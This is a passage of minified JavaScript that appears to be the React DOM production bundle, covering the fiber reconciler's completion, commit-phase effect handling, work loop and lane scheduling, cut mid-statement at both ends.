Error(se(318));if(r=e.memoizedState,r=r!==null?r.dehydrated:null,!r)throw Error(se(317));r[ti]=e}else Ar(),!(e.flags&128)&&(e.memoizedState=null),e.flags|=4;Gt(e),r=!1}else Hn!==null&&(sd(Hn),Hn=null),r=!0;if(!r)return e.flags&65536?e:null}return e.flags&128?(e.lanes=n,e):(i=i!==null,i!==(t!==null&&t.memoizedState!==null)&&i&&(e.child.flags|=8192,e.mode&1&&(t===null||mt.current&1?Pt===0&&(Pt=3):Wp())),e.updateQueue!==null&&(e.flags|=4),Gt(e),null);case 4:return Rr(),Ku(t,e),t===null&&Ra(e.stateNode.containerInfo),Gt(e),null;case 10:return Ap(e.type._context),Gt(e),null;case 17:return dn(e.type)&&vl(),Gt(e),null;case 19:if(ht(mt),r=e.memoizedState,r===null)return Gt(e),null;if(i=(e.flags&128)!==0,a=r.rendering,a===null)if(i)Kr(r,!1);else{if(Pt!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(a=El(t),a!==null){for(e.flags|=128,Kr(r,!1),i=a.updateQueue,i!==null&&(e.updateQueue=i,e.flags|=4),e.subtreeFlags=0,i=n,n=e.child;n!==null;)r=n,t=i,r.flags&=14680066,a=r.alternate,a===null?(r.childLanes=0,r.lanes=t,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=a.childLanes,r.lanes=a.lanes,r.child=a.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=a.memoizedProps,r.memoizedState=a.memoizedState,r.updateQueue=a.updateQueue,r.type=a.type,t=a.dependencies,r.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return dt(mt,mt.current&1|2),e.child}t=t.sibling}r.tail!==null&&wt()>kr&&(e.flags|=128,i=!0,Kr(r,!1),e.lanes=4194304)}else{if(!i)if(t=El(a),t!==null){if(e.flags|=128,i=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Kr(r,!0),r.tail===null&&r.tailMode==="hidden"&&!a.alternate&&!ft)return Gt(e),null}else 2*wt()-r.renderingStartTime>kr&&n!==1073741824&&(e.flags|=128,i=!0,Kr(r,!1),e.lanes=4194304);r.isBackwards?(a.sibling=e.child,e.child=a):(n=r.last,n!==null?n.sibling=a:e.child=a,r.last=a)}return r.tail!==null?(e=r.tail,r.rendering=e,r.tail=e.sibling,r.renderingStartTime=wt(),e.sibling=null,n=mt.current,dt(mt,i?n&1|2:n&1),e):(Gt(e),null);case 22:case 23:return Gp(),i=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==i&&(e.flags|=8192),i&&e.mode&1?_n&1073741824&&(Gt(e),e.subtreeFlags&6&&(e.flags|=8192)):Gt(e),null;case 24:return null;case 25:return null}throw Error(se(156,e.tag))}function _y(t,e){switch(wp(e),e.tag){case 1:return dn(e.type)&&vl(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return Rr(),ht(un),ht(Kt),Lp(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return kp(e),null;case 13:if(ht(mt),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(se(340));Ar()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return ht(mt),null;case 4:return Rr(),null;case 10:return Ap(e.type._context),null;case 22:case 23:return Gp(),null;case 24:return null;default:return null}}var So=!1,Xt=!1,xy=typeof WeakSet=="function"?WeakSet:Set,ve=null;function fr(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(i){yt(t,e,i)}else n.current=null}function Zu(t,e,n){try{n()}catch(i){yt(t,e,i)}}var bf=!1;function yy(t,e){if(Iu=hl,t=Wg(),Sp(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var i=n.getSelection&&n.getSelection();if(i&&i.rangeCount!==0){n=i.anchorNode;var s=i.anchorOffset,r=i.focusNode;i=i.focusOffset;try{n.nodeType,r.nodeType}catch{n=null;break e}var a=0,o=-1,l=-1,c=0,p=0,d=t,h=null;t:for(;;){for(var f;d!==n||s!==0&&d.nodeType!==3||(o=a+s),d!==r||i!==0&&d.nodeType!==3||(l=a+i),d.nodeType===3&&(a+=d.nodeValue.length),(f=d.firstChild)!==null;)h=d,d=f;for(;;){if(d===t)break t;if(h===n&&++c===s&&(o=a),h===r&&++p===i&&(l=a),(f=d.nextSibling)!==null)break;d=h,h=d.parentNode}d=f}n=o===-1||l===-1?null:{start:o,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(Du={focusedElem:t,selectionRange:n},hl=!1,ve=e;ve!==null;)if(e=ve,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,ve=t;else for(;ve!==null;){e=ve;try{var v=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(v!==null){var y=v.memoizedProps,m=v.memoizedState,u=e.stateNode,g=u.getSnapshotBeforeUpdate(e.elementType===e.type?y:zn(e.type,y),m);u.__reactInternalSnapshotBeforeUpdate=g}break;case 3:var _=e.stateNode.containerInfo;_.nodeType===1?_.textContent="":_.nodeType===9&&_.documentElement&&_.removeChild(_.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(se(163))}}catch(b){yt(e,e.return,b)}if(t=e.sibling,t!==null){t.return=e.return,ve=t;break}ve=e.return}return v=bf,bf=!1,v}function _a(t,e,n){var i=e.updateQueue;if(i=i!==null?i.lastEffect:null,i!==null){var s=i=i.next;do{if((s.tag&t)===t){var r=s.destroy;s.destroy=void 0,r!==void 0&&Zu(e,n,r)}s=s.next}while(s!==i)}}function Xl(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var i=n.create;n.destroy=i()}n=n.next}while(n!==e)}}function Ju(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function zv(t){var e=t.alternate;e!==null&&(t.alternate=null,zv(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[ti],delete e[ka],delete e[Fu],delete e[ny],delete e[iy])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function Vv(t){return t.tag===5||t.tag===3||t.tag===4}function wf(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||Vv(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function Qu(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=gl));else if(i!==4&&(t=t.child,t!==null))for(Qu(t,e,n),t=t.sibling;t!==null;)Qu(t,e,n),t=t.sibling}function ed(t,e,n){var i=t.tag;if(i===5||i===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(i!==4&&(t=t.child,t!==null))for(ed(t,e,n),t=t.sibling;t!==null;)ed(t,e,n),t=t.sibling}var Ot=null,Vn=!1;function Ii(t,e,n){for(n=n.child;n!==null;)Hv(t,e,n),n=n.sibling}function Hv(t,e,n){if(si&&typeof si.onCommitFiberUnmount=="function")try{si.onCommitFiberUnmount(Fl,n)}catch{}switch(n.tag){case 5:Xt||fr(n,e);case 6:var i=Ot,s=Vn;Ot=null,Ii(t,e,n),Ot=i,Vn=s,Ot!==null&&(Vn?(t=Ot,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):Ot.removeChild(n.stateNode));break;case 18:Ot!==null&&(Vn?(t=Ot,n=n.stateNode,t.nodeType===8?wc(t.parentNode,n):t.nodeType===1&&wc(t,n),Ta(t)):wc(Ot,n.stateNode));break;case 4:i=Ot,s=Vn,Ot=n.stateNode.containerInfo,Vn=!0,Ii(t,e,n),Ot=i,Vn=s;break;case 0:case 11:case 14:case 15:if(!Xt&&(i=n.updateQueue,i!==null&&(i=i.lastEffect,i!==null))){s=i=i.next;do{var r=s,a=r.destroy;r=r.tag,a!==void 0&&(r&2||r&4)&&Zu(n,e,a),s=s.next}while(s!==i)}Ii(t,e,n);break;case 1:if(!Xt&&(fr(n,e),i=n.stateNode,typeof i.componentWillUnmount=="function"))try{i.props=n.memoizedProps,i.state=n.memoizedState,i.componentWillUnmount()}catch(o){yt(n,e,o)}Ii(t,e,n);break;case 21:Ii(t,e,n);break;case 22:n.mode&1?(Xt=(i=Xt)||n.memoizedState!==null,Ii(t,e,n),Xt=i):Ii(t,e,n);break;default:Ii(t,e,n)}}function Ef(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new xy),e.forEach(function(i){var s=Ry.bind(null,t,i);n.has(i)||(n.add(i),i.then(s,s))})}}function Un(t,e){var n=e.deletions;if(n!==null)for(var i=0;i<n.length;i++){var s=n[i];try{var r=t,a=e,o=a;e:for(;o!==null;){switch(o.tag){case 5:Ot=o.stateNode,Vn=!1;break e;case 3:Ot=o.stateNode.containerInfo,Vn=!0;break e;case 4:Ot=o.stateNode.containerInfo,Vn=!0;break e}o=o.return}if(Ot===null)throw Error(se(160));Hv(r,a,s),Ot=null,Vn=!1;var l=s.alternate;l!==null&&(l.return=null),s.return=null}catch(c){yt(s,e,c)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)Gv(e,t),e=e.sibling}function Gv(t,e){var n=t.alternate,i=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Un(e,t),Zn(t),i&4){try{_a(3,t,t.return),Xl(3,t)}catch(y){yt(t,t.return,y)}try{_a(5,t,t.return)}catch(y){yt(t,t.return,y)}}break;case 1:Un(e,t),Zn(t),i&512&&n!==null&&fr(n,n.return);break;case 5:if(Un(e,t),Zn(t),i&512&&n!==null&&fr(n,n.return),t.flags&32){var s=t.stateNode;try{ba(s,"")}catch(y){yt(t,t.return,y)}}if(i&4&&(s=t.stateNode,s!=null)){var r=t.memoizedProps,a=n!==null?n.memoizedProps:r,o=t.type,l=t.updateQueue;if(t.updateQueue=null,l!==null)try{o==="input"&&r.type==="radio"&&r.name!=null&&dg(s,r),Eu(o,a);var c=Eu(o,r);for(a=0;a<l.length;a+=2){var p=l[a],d=l[a+1];p==="style"?gg(s,d):p==="dangerouslySetInnerHTML"?fg(s,d):p==="children"?ba(s,d):lp(s,p,d,c)}switch(o){case"input":xu(s,r);break;case"textarea":pg(s,r);break;case"select":var h=s._wrapperState.wasMultiple;s._wrapperState.wasMultiple=!!r.multiple;var f=r.value;f!=null?vr(s,!!r.multiple,f,!1):h!==!!r.multiple&&(r.defaultValue!=null?vr(s,!!r.multiple,r.defaultValue,!0):vr(s,!!r.multiple,r.multiple?[]:"",!1))}s[ka]=r}catch(y){yt(t,t.return,y)}}break;case 6:if(Un(e,t),Zn(t),i&4){if(t.stateNode===null)throw Error(se(162));s=t.stateNode,r=t.memoizedProps;try{s.nodeValue=r}catch(y){yt(t,t.return,y)}}break;case 3:if(Un(e,t),Zn(t),i&4&&n!==null&&n.memoizedState.isDehydrated)try{Ta(e.containerInfo)}catch(y){yt(t,t.return,y)}break;case 4:Un(e,t),Zn(t);break;case 13:Un(e,t),Zn(t),s=t.child,s.flags&8192&&(r=s.memoizedState!==null,s.stateNode.isHidden=r,!r||s.alternate!==null&&s.alternate.memoizedState!==null||(Vp=wt())),i&4&&Ef(t);break;case 22:if(p=n!==null&&n.memoizedState!==null,t.mode&1?(Xt=(c=Xt)||p,Un(e,t),Xt=c):Un(e,t),Zn(t),i&8192){if(c=t.memoizedState!==null,(t.stateNode.isHidden=c)&&!p&&t.mode&1)for(ve=t,p=t.child;p!==null;){for(d=ve=p;ve!==null;){switch(h=ve,f=h.child,h.tag){case 0:case 11:case 14:case 15:_a(4,h,h.return);break;case 1:fr(h,h.return);var v=h.stateNode;if(typeof v.componentWillUnmount=="function"){i=h,n=h.return;try{e=i,v.props=e.memoizedProps,v.state=e.memoizedState,v.componentWillUnmount()}catch(y){yt(i,n,y)}}break;case 5:fr(h,h.return);break;case 22:if(h.memoizedState!==null){Tf(d);continue}}f!==null?(f.return=h,ve=f):Tf(d)}p=p.sibling}e:for(p=null,d=t;;){if(d.tag===5){if(p===null){p=d;try{s=d.stateNode,c?(r=s.style,typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"):(o=d.stateNode,l=d.memoizedProps.style,a=l!=null&&l.hasOwnProperty("display")?l.display:null,o.style.display=mg("display",a))}catch(y){yt(t,t.return,y)}}}else if(d.tag===6){if(p===null)try{d.stateNode.nodeValue=c?"":d.memoizedProps}catch(y){yt(t,t.return,y)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===t)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===t)break e;for(;d.sibling===null;){if(d.return===null||d.return===t)break e;p===d&&(p=null),d=d.return}p===d&&(p=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:Un(e,t),Zn(t),i&4&&Ef(t);break;case 21:break;default:Un(e,t),Zn(t)}}function Zn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(Vv(n)){var i=n;break e}n=n.return}throw Error(se(160))}switch(i.tag){case 5:var s=i.stateNode;i.flags&32&&(ba(s,""),i.flags&=-33);var r=wf(t);ed(t,r,s);break;case 3:case 4:var a=i.stateNode.containerInfo,o=wf(t);Qu(t,o,a);break;default:throw Error(se(161))}}catch(l){yt(t,t.return,l)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function Sy(t,e,n){ve=t,Wv(t)}function Wv(t,e,n){for(var i=(t.mode&1)!==0;ve!==null;){var s=ve,r=s.child;if(s.tag===22&&i){var a=s.memoizedState!==null||So;if(!a){var o=s.alternate,l=o!==null&&o.memoizedState!==null||Xt;o=So;var c=Xt;if(So=a,(Xt=l)&&!c)for(ve=s;ve!==null;)a=ve,l=a.child,a.tag===22&&a.memoizedState!==null?Af(s):l!==null?(l.return=a,ve=l):Af(s);for(;r!==null;)ve=r,Wv(r),r=r.sibling;ve=s,So=o,Xt=c}Mf(t)}else s.subtreeFlags&8772&&r!==null?(r.return=s,ve=r):Mf(t)}}function Mf(t){for(;ve!==null;){var e=ve;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Xt||Xl(5,e);break;case 1:var i=e.stateNode;if(e.flags&4&&!Xt)if(n===null)i.componentDidMount();else{var s=e.elementType===e.type?n.memoizedProps:zn(e.type,n.memoizedProps);i.componentDidUpdate(s,n.memoizedState,i.__reactInternalSnapshotBeforeUpdate)}var r=e.updateQueue;r!==null&&cf(e,r,i);break;case 3:var a=e.updateQueue;if(a!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}cf(e,a,n)}break;case 5:var o=e.stateNode;if(n===null&&e.flags&4){n=o;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var c=e.alternate;if(c!==null){var p=c.memoizedState;if(p!==null){var d=p.dehydrated;d!==null&&Ta(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(se(163))}Xt||e.flags&512&&Ju(e)}catch(h){yt(e,e.return,h)}}if(e===t){ve=null;break}if(n=e.sibling,n!==null){n.return=e.return,ve=n;break}ve=e.return}}function Tf(t){for(;ve!==null;){var e=ve;if(e===t){ve=null;break}var n=e.sibling;if(n!==null){n.return=e.return,ve=n;break}ve=e.return}}function Af(t){for(;ve!==null;){var e=ve;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{Xl(4,e)}catch(l){yt(e,n,l)}break;case 1:var i=e.stateNode;if(typeof i.componentDidMount=="function"){var s=e.return;try{i.componentDidMount()}catch(l){yt(e,s,l)}}var r=e.return;try{Ju(e)}catch(l){yt(e,r,l)}break;case 5:var a=e.return;try{Ju(e)}catch(l){yt(e,a,l)}}}catch(l){yt(e,e.return,l)}if(e===t){ve=null;break}var o=e.sibling;if(o!==null){o.return=e.return,ve=o;break}ve=e.return}}var by=Math.ceil,Al=Ni.ReactCurrentDispatcher,Bp=Ni.ReactCurrentOwner,Ln=Ni.ReactCurrentBatchConfig,Xe=0,Ut=null,At=null,zt=0,_n=0,mr=us(0),Pt=0,Oa=null,Us=0,ql=0,zp=0,xa=null,ln=null,Vp=0,kr=1/0,_i=null,Cl=!1,td=null,ns=null,bo=!1,Yi=null,Rl=0,ya=0,nd=null,Qo=-1,el=0;function en(){return Xe&6?wt():Qo!==-1?Qo:Qo=wt()}function is(t){return t.mode&1?Xe&2&&zt!==0?zt&-zt:ry.transition!==null?(el===0&&(el=Cg()),el):(t=st,t!==0||(t=window.event,t=t===void 0?16:Dg(t.type)),t):1}function qn(t,e,n,i){if(50<ya)throw ya=0,nd=null,Error(se(185));qa(t,n,i),(!(Xe&2)||t!==Ut)&&(t===Ut&&(!(Xe&2)&&(ql|=n),Pt===4&&ji(t,zt)),pn(t,i),n===1&&Xe===0&&!(e.mode&1)&&(kr=wt()+500,Gl&&ds()))}function pn(t,e){var n=t.callbackNode;rx(t,e);var i=pl(t,t===Ut?zt:0);if(i===0)n!==null&&Dh(n),t.callbackNode=null,t.callbackPriority=0;else if(e=i&-i,t.callbackPriority!==e){if(n!=null&&Dh(n),e===1)t.tag===0?sy(Cf.bind(null,t)):ev(Cf.bind(null,t)),ey(function(){!(Xe&6)&&ds()}),n=null;else{switch(Rg(i)){case 1:n=hp;break;case 4:n=Tg;break;case 16:n=dl;break;case 536870912:n=Ag;break;default:n=dl}n=Jv(n,jv.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function jv(t,e){if(Qo=-1,el=0,Xe&6)throw Error(se(327));var n=t.callbackNode;if(br()&&t.callbackNode!==n)return null;var i=pl(t,t===Ut?zt:0);if(i===0)return null;if(i&30||i&t.expiredLanes||e)e=Pl(t,i);else{e=i;var s=Xe;Xe|=2;var r=qv();(Ut!==t||zt!==e)&&(_i=null,kr=wt()+500,ks(t,e));do try{My();break}catch(o){Xv(t,o)}while(!0);Tp(),Al.current=r,Xe=s,At!==null?e=0:(Ut=null,zt=0,e=Pt)}if(e!==0){if(e===2&&(s=Ru(t),s!==0&&(i=s,e=id(t,s))),e===1)throw n=Oa,ks(t,0),ji(t,i),pn(t,wt()),n;if(e===6)ji(t,i);else{if(s=t.current.alternate,!(i&30)&&!wy(s)&&(e=Pl(t,i),e===2&&(r=Ru(t),r!==0&&(i=r,e=id(t,r))),e===1))throw n=Oa,ks(t,0),ji(t,i),pn(t,wt()),n;switch(t.finishedWork=s,t.finishedLanes=i,e){case 0:case 1:throw Error(se(345));case 2:bs(t,ln,_i);break;case 3:if(ji(t,i),(i&130023424)===i&&(e=Vp+500-wt(),10<e)){if(pl(t,0)!==0)break;if(s=t.suspendedLanes,(s&i)!==i){en(),t.pingedLanes|=t.suspendedLanes&s;break}t.timeoutHandle=Ou(bs.bind(null,t,ln,_i),e);break}bs(t,ln,_i);break;case 4:if(ji(t,i),(i&4194240)===i)break;for(e=t.eventTimes,s=-1;0<i;){var a=31-Xn(i);r=1<<a,a=e[a],a>s&&(s=a),i&=~r}if(i=s,i=wt()-i,i=(120>i?120:480>i?480:1080>i?1080:1920>i?1920:3e3>i?3e3:4320>i?4320:1960*by(i/1960))-i,10<i){t.timeoutHandle=Ou(bs.bind(null,t,ln,_i),i);break}bs(t,ln,_i);break;case 5:bs(t,ln,_i);break;default:throw Error(se(329))}}}return pn(t,wt()),t.callbackNode===n?jv.bind(null,t):null}function id(t,e){var n=xa;return t.current.memoizedState.isDehydrated&&(ks(t,e).flags|=256),t=Pl(t,e),t!==2&&(e=ln,ln=n,e!==null&&sd(e)),t}function sd(t){ln===null?ln=t:ln.push.apply(ln,t)}function wy(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var i=0;i<n.length;i++){var s=n[i],r=s.getSnapshot;s=s.value;try{if(!Yn(r(),s))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function ji(t,e){for(e&=~zp,e&=~ql,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-Xn(e),i=1<<n;t[n]=-1,e&=~i}}function Cf(t){if(Xe&6)throw Error(se(327));br();var e=pl(t,0);if(!(e&1))return pn(t,wt()),null;var n=Pl(t,e);if(t.tag!==0&&n===2){var i=Ru(t);i!==0&&(e=i,n=id(t,i))}if(n===1)throw n=Oa,ks(t,0),ji(t,e),pn(t,wt()),n;if(n===6)throw Error(se(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,bs(t,ln,_i),pn(t,wt()),null}function Hp(t,e){var n=Xe;Xe|=1;try{return t(e)}finally{Xe=n,Xe===0&&(kr=wt()+500,Gl&&ds())}}function Os(t){Yi!==null&&Yi.tag===0&&!(Xe&6)&&br();var e=Xe;Xe|=1;var n=Ln.transition,i=st;try{if(Ln.transition=null,st=1,t)return t()}finally{st=i,Ln.transition=n,Xe=e,!(Xe&6)&&ds()}}function Gp(){_n=mr.current,ht(mr)}function ks(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,Qx(n)),At!==null)for(n=At.return;n!==null;){var i=n;switch(wp(i),i.tag){case 1:i=i.type.childContextTypes,i!=null&&vl();break;case 3:Rr(),ht(un),ht(Kt),Lp();break;case 5:kp(i);break;case 4:Rr();break;case 13:ht(mt);break;case 19:ht(mt);break;case 10:Ap(i.type._context);break;case 22:case 23:Gp()}n=n.return}if(Ut=t,At=t=ss(t.current,null),zt=_n=e,Pt=0,Oa=null,zp=ql=Us=0,ln=xa=null,As!==null){for(e=0;e<As.length;e++)if(n=As[e],i=n.interleaved,i!==null){n.interleaved=null;var s=i.next,r=n.pending;if(r!==null){var a=r.next;r.next=s,i.next=a}n.pending=i}As=null}return t}function Xv(t,e){do{var n=At;try{if(Tp(),Ko.current=Tl,Ml){for(var i=gt.memoizedState;i!==null;){var s=i.queue;s!==null&&(s.pending=null),i=i.next}Ml=!1}if(Ds=0,Dt=Rt=gt=null,va=!1,Ia=0,Bp.current=null,n===null||n.return===null){Pt=1,Oa=e,At=null;break}e:{var r=t,a=n.return,o=n,l=e;if(e=zt,o.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var c=l,p=o,d=p.tag;if(!(p.mode&1)&&(d===0||d===11||d===15)){var h=p.alternate;h?(p.updateQueue=h.updateQueue,p.memoizedState=h.memoizedState,p.lanes=h.lanes):(p.updateQueue=null,p.memoizedState=null)}var f=mf(a);if(f!==null){f.flags&=-257,gf(f,a,o,r,e),f.mode&1&&ff(r,c,e),e=f,l=c;var v=e.updateQueue;if(v===null){var y=new Set;y.add(l),e.updateQueue=y}else v.add(l);break e}else{if(!(e&1)){ff(r,c,e),Wp();break e}l=Error(se(426))}}else if(ft&&o.mode&1){var m=mf(a);if(m!==null){!(m.flags&65536)&&(m.flags|=256),gf(m,a,o,r,e),Ep(Pr(l,o));break e}}r=l=Pr(l,o),Pt!==4&&(Pt=2),xa===null?xa=[r]:xa.push(r),r=a;do{switch(r.tag){case 3:r.flags|=65536,e&=-e,r.lanes|=e;var u=Rv(r,l,e);lf(r,u);break e;case 1:o=l;var g=r.type,_=r.stateNode;if(!(r.flags&128)&&(typeof g.getDerivedStateFromError=="function"||_!==null&&typeof _.componentDidCatch=="function"&&(ns===null||!ns.has(_)))){r.flags|=65536,e&=-e,r.lanes|=e;var b=Pv(r,o,e);lf(r,b);break e}}r=r.return}while(r!==null)}$v(n)}catch(T){e=T,At===n&&n!==null&&(At=n=n.return);continue}break}while(!0)}function qv(){var t=Al.current;return Al.current=Tl,t===null?Tl:t}function Wp(){(Pt===0||Pt===3||Pt===2)&&(Pt=4),Ut===null||!(Us&268435455)&&!(ql&268435455)||ji(Ut,zt)}function Pl(t,e){var n=Xe;Xe|=2;var i=qv();(Ut!==t||zt!==e)&&(_i=null,ks(t,e));do try{Ey();break}catch(s){Xv(t,s)}while(!0);if(Tp(),Xe=n,Al.current=i,At!==null)throw Error(se(261));return Ut=null,zt=0,Pt}function Ey(){for(;At!==null;)Yv(At)}function My(){for(;At!==null&&!K_();)Yv(At)}function Yv(t){var e=Zv(t.alternate,t,_n);t.memoizedProps=t.pendingProps,e===null?$v(t):At=e,Bp.current=null}function $v(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=_y(n,e),n!==null){n.flags&=32767,At=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{Pt=6,At=null;return}}else if(n=vy(n,e,_n),n!==null){At=n;return}if(e=e.sibling,e!==null){At=e;return}At=e=t}while(e!==null);Pt===0&&(Pt=5)}function bs(t,e,n){var i=st,s=Ln.transition;try{Ln.transition=null,st=1,Ty(t,e,n,i)}finally{Ln.transition=s,st=i}return null}function Ty(t,e,n,i){do br();while(Yi!==null);if(Xe&6)throw Error(se(327));n=t.finishedWork;var s=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(se(177));t.callbackNode=null,t.callbackPriority=0;var r=n.lanes|n.childLanes;if(ax(t,r),t===Ut&&(At=Ut=null,zt=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||bo||(bo=!0,Jv(dl,function(){return br(),null})),r=(n.flags&15990)!==0,n.subtreeFlags&15990||r){r=Ln.transition,Ln.transition=null;var a=st;st=1;var o=Xe;Xe|=4,Bp.current=null,yy(t,n),Gv(n,t),Xx(Du),hl=!!Iu,Du=Iu=null,t.current=n,Sy(n),Z_(),Xe=o,st=a,Ln.transition=r}else t.current=n;if(bo&&(bo=!1,Yi=t,Rl=s),r=t.pendingLanes,r===0&&(ns=null),ex(n.stateNode),pn(t,wt()),e!==null)for(i=t.onRecoverableError,n=0;n<e.length;n++)s=e[n],i(s.value,{componentStack:s.stack,digest:s.digest});if(Cl)throw Cl=!1,t=td,td=null,t;return Rl&1&&t.tag!==0&&br(),r=t.pendingLanes,r&1?t===nd?ya++:(ya=0,nd=t):ya=0,ds(),null}function br(){if(Yi!==null){var t=Rg(Rl),e=Ln.transition,n=st;try{if(Ln.transition=null,st=16>t?16:t,Yi===null)var i=!1;else{if(t=Yi,Yi=null,Rl=0,Xe&6)throw Error(se(331));var s=Xe;for(Xe|=4,ve=t.current;ve!==null;){var r=ve,a=r.child;if(ve.flags&16){var o=r.deletions;if(o!==null){for(var l=0;l<o.length;l++){var c=o[l];for(ve=c;ve!==null;){var p=ve;switch(p.tag){case 0:case 11:case 15:_a(8,p,r)}var d=p.child;if(d!==null)d.return=p,ve=d;else for(;ve!==null;){p=ve;var h=p.sibling,f=p.return;if(zv(p),p===c){ve=null;break}if(h!==null){h.return=f,ve=h;break}ve=f}}}var v=r.alternate;if(v!==null){var y=v.child;if(y!==null){v.child=null;do{var m=y.sibling;y.sibling=null,y=m}while(y!==null)}}ve=r}}if(r.subtreeFlags&2064&&a!==null)a.return=r,ve=a;else e:for(;ve!==null;){if(r=ve,r.flags&2048)switch(r.tag){case 0:case 11:case 15:_a(9,r,r.return)}var u=r.sibling;if(u!==null){u.return=r.return,ve=u;break e}ve=r.return}}var g=t.current;for(ve=g;ve!==null;){a=ve;var _=a.child;if(a.subtreeFlags&2064&&_!==null)_.return=a,ve=_;else e:for(a=g;ve!==null;){if(o=ve,o.flags&2048)try{switch(o.tag){case 0:case 11:case 15:Xl(9,o)}}catch(T){yt(o,o.return,T)}if(o===a){ve=null;break e}var b=o.sibling;if(b!==null){b.return=o.return,ve=b;break e}ve=o.return}}if(Xe=s,ds(),si&&typeof si.onPostCommitFiberRoot=="function")try{si.onPostCommitFiberRoot(Fl,t)}catch{}i=!0}return i}finally{st=n,Ln.transition=e}}return!1}function Rf(t,e,n){e=Pr(n,e),e=Rv(t,e,1),t=ts(t,e,1),e=en(),t!==null&&(qa(t,1,e),pn(t,e))}function yt(t,e,n){if(t.tag===3)Rf(t,t,n);else for(;e!==null;){if(e.tag===3){Rf(e,t,n);break}else if(e.tag===1){var i=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof i.componentDidCatch=="function"&&(ns===null||!ns.has(i))){t=Pr(n,t),t=Pv(e,t,1),e=ts(e,t,1),t=en(),e!==null&&(qa(e,1,t),pn(e,t));break}}e=e.return}}function Ay(t,e,n){var i=t.pingCache;i!==null&&i.delete(e),e=en(),t.pingedLanes|=t.suspendedLanes&n,Ut===t&&(zt&n)===n&&(Pt===4||Pt===3&&(zt&130023424)===zt&&500>wt()-Vp?ks(t,0):zp|=n),pn(t,e)}function Kv(t,e){e===0&&(t.mode&1?(e=po,po<<=1,!(po&130023424)&&(po=4194304)):e=1);var n=en();t=Ri(t,e),t!==null&&(qa(t,e,n),pn(t,n))}function Cy(t){var 